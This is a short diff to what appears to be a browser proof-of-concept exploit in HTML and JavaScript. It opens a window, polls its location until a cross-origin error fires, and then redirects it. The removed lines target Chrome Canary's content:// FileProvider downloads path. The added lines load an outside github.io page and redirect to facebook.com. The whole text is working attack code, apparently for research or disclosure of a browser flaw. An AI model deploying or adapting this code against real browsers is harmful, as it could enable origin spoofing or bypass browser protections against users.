@@ -1,14 +1,12 @@
 
 <script>
   function next() {
-         w.location.replace('https://www.google.com:1234');
+         w.location.replace('https://www.facebook.com');
         }
 
   function f() {
-    w = window.open("");
-    w.document.write('<input />');
-    w.location = "content://com.chrome.canary.FileProvider/downloads/poc.html";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+    w = window.open("https://lbstyle.github.io/2019.html");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 2212); 
   }
 </script>
 
